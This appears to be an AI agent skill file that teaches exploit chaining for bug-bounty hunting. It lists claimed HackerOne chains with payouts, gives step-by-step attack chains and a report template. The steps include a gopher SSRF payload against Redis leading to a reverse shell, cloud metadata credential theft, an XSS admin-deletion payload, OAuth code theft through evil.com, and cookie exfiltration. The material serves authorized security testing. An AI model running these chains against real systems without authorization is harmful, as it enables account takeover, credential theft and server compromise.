---
name: chaining-deep-dive
description: Complete exploit chain methodology with 20 real HackerOne attack chains, chain types, automation, and reporting templates
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - chain methodology
  - exploit chain
  - vulnerability chaining
  - attack chain
  - skills chaining
---

# Exploit Chain Methodology — Real HackerOne Attack Chains

## What Makes a Chain Critical
A single low/medium bug chained with another becomes critical. Triage teams reward chains more than standalone bugs.

## The Chain Mindset
For every finding, ask: "What can I do with this that the developer didn't intend?"

## Top 20 Real Attack Chains (with H1 Reports)

| # | Chain | Program | Bounty | Report |
|---|-------|---------|--------|--------|
| 1 | Open Redirect → OAuth Token Theft → Full ATO | Uber | $10,000+ | N/A |
| 2 | SSRF → Cloud Metadata → IAM Keys → Full Cloud Compromise | Dropbox | $17,576 | #1406938 |
| 3 | XSS → CSRF → Privilege Escalation → Admin Panel Access | GitLab | $10,000 | #132707 |
| 4 | IDOR (read victim email) → Password Reset → ATO | HackerOne | $3,500 | #1633387 |
| 5 | Cache Poisoning → XSS → Session Hijacking → ATO | Glassdoor | $1,000+ | #1027596 |
| 6 | Race Condition → Coupon Abuse → Unlimited Discount | Shopify | $10,500 | #216888 |
| 7 | Subdomain Takeover → XSS → Full ATO | Slack | $5,000 | #484731 |
| 8 | SSRF → Redis → Crontab RCE → Server Compromise | LocalMotors | $5,000 | N/A |
| 9 | IDOR (change any user email) → Forgot Password → ATO | HackerOne | $5,000 | #668957 |
| 10 | CRLF Injection → Open Redirect → OAuth Token Theft → ATO | TikTok | $1,500+ | N/A |
| 11 | LFI → /proc/self/environ → SSRF → Cloud Metadata | Reddit | $6,000 | #1960765 |
| 12 | XSS → DOM Clobbering → CSP Bypass → Data Exfil | HackerOne | $1,500 | N/A |
| 13 | GraphQL Batching → Rate Limit Bypass → Credential Stuffing | Shopify | $3,000 | N/A |
| 14 | NoSQLi → Auth Bypass → Admin Panel → RCE | Various | $5,000+ | N/A |
| 15 | SSTI → RCE → Internal Network → Data Exfil | Uber | $10,000 | N/A |
| 16 | Host Header Injection → Cache Poisoning → XSS → User Impersonation | Shopify | $2,900 | #1443838 |
| 17 | XXE → SSRF → Cloud Metadata → IAM Credentials | Facebook | $10,000 | N/A |
| 18 | Path Traversal → Source Code Disclosure → Hardcoded Keys → Cryptojacking | Many | $3,000+ | N/A |
| 19 | Authorization Bypass via Path Traversal → IDOR chain → Admin Escalation | Shopify | $18,000 | N/A |
| 20 | Self-XSS → X-Frame-Options Bypass via iframe → Victim Executes XSS | Instagram | $7,500 | N/A |

## How to Build a Chain (Methodology)

### Step 1: Start With Any Finding
Every valid finding is a chain starter. Map it to:

- **Can read something?** → Information Disclosure → more sensitive data
- **Can write something?** → Content Injection → Stored XSS → Session hijack
- **Can bypass something?** → Auth Bypass → Admin functions → RCE
- **Can redirect something?** → Open Redirect → OAuth token theft → ATO
- **Can make server fetch?** → SSRF → Cloud metadata → IAM credentials → Cloud compromise

### Step 2: Find the Pivot
The pivot is where your bug B meets bug A. Common pivots:
- XSS can read any page the victim has access to → pivots to IDOR/CSRF
- SSRF can reach any internal service → pivots to RCE/Data theft
- IDOR gives you the target's data → pivots to ATO/Password reset
- Open Redirect steals OAuth tokens → pivots to ATO
- Cache Poisoning serves your payload → pivots to XSS/Session theft

### Step 3: Verify the Chain End-to-End
1. Document each step independently
2. Show the chain flows: A → B → Impact
3. Calculate combined CVSS (use AC:H for chaining requirement)
4. Report as single submission titled "Chain: A + B achieving Impact"

## Chain Type #1: SSRF → Internal Service → RCE

### SSRF → Redis → Crontab RCE
```
1. Find SSRF in image_url/profile_photo/avatar parameter
2. Use Gopher protocol: gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a...
3. Write SSH key to /root/.ssh/authorized_keys 
4. OR write crontab reverse shell
5. Get shell access to internal server
```

Relevant: SSRF to Redis via gopher, SSRF to Elasticsearch (Groovy RCE), SSRF to Jenkins (script console), SSRF to Consul/Etcd (service registration)

### SSRF → Cloud Metadata → IAM / Cloud Compromise
```
1. Find SSRF in any URL parameter
2. Hit http://169.254.169.254/latest/meta-data/iam/security-credentials/
3. Get admin role name from step 2
4. Hit http://169.254.169.254/latest/meta-data/iam/security-credentials/{role-name}
5. Get AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN
6. Use awscli: aws s3 ls, aws ec2 describe-instances
```

## Chain Type #2: XSS → CSRF → Privilege Escalation

### Stored XSS in Profile → Admin Visits → Full Admin Access
```
1. Find stored XSS (e.g., in profile bio, comment, file upload)
2. Craft XSS that executes CSRF to change admin password
3. XSS payload: fetch('/admin/users/123', {method: 'DELETE'})
4. When admin views the page, payload fires against admin session
5. Admin account deleted or modified
```

## Chain Type #3: IDOR → ATO

### IDOR to Read Email → Password Reset → ATO
```
1. Find IDOR that leaks user's email (e.g., /api/users/{id}/profile)
2. Victim's email = leaked_xxx@target.com
3. Use leaked email on forgot-password endpoint
4. If password reset token is predictable or sent via email, you have both
5. Reset password → login as victim → ATO
```

### IDOR to Change Email → Forgot Password → ATO
```
1. Find IDOR that allows changing victim's email (e.g., PATCH /api/users/{id}/email)
2. Change victim_email123@domain.com → attacker_email@evil.com
3. Use forgot-password on attacker_email@evil.com
4. Receive reset link → change password → login as victim
5. Note: victim can't login anymore, so impact is high
```

## Chain Type #4: Open Redirect → OAuth → ATO

### OAuth redirect_uri Abuse
```
1. Find open redirect on target domain
2. Find OAuth login: https://target.com/oauth/authorize?redirect_uri=https://target.com/oauth/callback
3. Change redirect_uri to your open redirect: ?redirect_uri=https://target.com/open-redirect?url=https://evil.com
4. Victim clicks your crafted OAuth login link
5. Victim authorizes, OAuth code sent to your evil.com via redirect
6. Use stolen code to login as victim → ATO
```

## Chain Type #5: Cache Poisoning → XSS → Session Hijack

### Unkeyed Header Cache Poisoning
```
1. Find unkeyed header (X-Forwarded-Host, X-Original-URL) that reflects in response
2. Inject XSS payload: X-Forwarded-Host: foo"><script>alert(1)</script>
3. Cache stores poisoned response
4. All users hitting cache get XSS
5. XSS exfiltrates cookies to attacker server
6. Attacker hijacks sessions → ATO
```

## Automation: Chain Scanner

```bash
#!/bin/bash
# chain-scanner.sh - Find common chain patterns
TARGET="$1"

echo "[*] Checking SSRF → Cloud Metadata chain..."
if grep -q "169.254.169.254\|metadata.google" recon/$TARGET/params.txt; then
  echo "[+] POTENTIAL CHAIN: SSRF → Cloud Metadata"
fi

echo "[*] Checking Open Redirect → OAuth chain..."
if grep -qE '(redirect|next|callback|return|logout)' recon/$TARGET/urls.txt; then
  echo "[+] POTENTIAL CHAIN: Open Redirect → OAuth Token Theft"
fi

echo "[*] Checking IDOR → ATO chain..."
if grep -qE '(user|account|profile|email).*(id|uuid|token)' recon/$TARGET/endpoints.txt; then
  echo "[+] POTENTIAL CHAIN: IDOR → ATO via email leak"
fi

echo "[*] Checking XSS → CSRF chain..."
if grep -qE '(comment|bio|name|profile|review|message)' recon/$TARGET/params.txt; then
  echo "[+] POTENTIAL CHAIN: Stored XSS → CSRF → Privilege Escalation"
fi

echo "[*] Checking SSRF → Internal RCE chain..."
if grep -qE '(redis|6379|elastic|9200|jenkins|8080|consul|8500)' recon/$TARGET/params.txt; then
  echo "[+] POTENTIAL CHAIN: SSRF → Internal Service RCE"
fi
```

## Report Template for Chains

When reporting a chain, use this structure:

**Title:** [PRIMARY VULN] → [SECONDARY VULN] → [IMPACT]

**Summary:** By chaining [VULN_A] with [VULN_B], an attacker can achieve [CRITICAL_IMPACT] without user interaction.

**Impact:** [One sentence: what attacker can do]

**Chain Steps:**
1. Step A: [VULN_A exploit with PoC]
2. Step B: [VULN_B exploit building on Step A]
3. Step C: [Final impact]

**Proof of Concept (End-to-End):**
[Full request/response chain]

**CVSS:** CVSS:3.1/... — Note: Chaining may increase severity

**Combined CVSS Score:** 8.0-10.0 Critical (depending on chain)

**Remediation:** Fix each vulnerability independently to break the chain.

## Payout Range by Chain Type

| Chain Type | Typical Payout | Max Payout |
|-----------|---------------|-----------|
| SSRF → Cloud Metadata → IAM | $5,000 - $15,000 | $30,000+ |
| Open Redirect → OAuth → ATO | $3,000 - $10,000 | $35,000+ |
| IDOR → Email Leak → Password Reset → ATO | $2,000 - $10,000 | $18,000+ |
| XSS → CSRF → Privilege Escalation | $1,000 - $10,000 | $15,000+ |
| SSRF → Redis/Cron → RCE | $5,000 - $15,000 | $20,000+ |
| Cache Poisoning → XSS → Session Hijack | $2,000 - $8,000 | $10,000+ |
| Subdomain Takeover → XSS → ATO | $2,000 - $5,000 | $7,500+ |
| LFI → SSRF → Cloud Metadata | $3,000 - $6,000 | $10,000+ |
| SMUGGLING → XSS → Session Hijack | $3,000 - $7,500 | $10,000+ |
| Race Condition → Financial Abuse | $2,000 - $10,500 | $15,000+ |

## Chain Kill List (Don't Report These)

- Two independent low-impact bugs with no actual chaining mechanism
- Bugs that require victim interaction more than once
- "If attacker already has admin access, they can X" — that's not a chain
- Self-XSS + CSRF (self-XSS requires victim to paste code)
- IDOR on own account + another IDOR on own account  
- Two bugs on different subdomains with different scopes

## Chain Urgency Matrix

Use this to prioritize which chains to pursue:

```
                     High Chain Value
                    /                 \
          Easy Chain                  Hard Chain
         /          \                /          \
    Quick P3        P2-P1        P2-P1          P1-Critical
   ($500-2k)     ($2k-10k)     ($3k-15k)      ($10k-30k+)
```
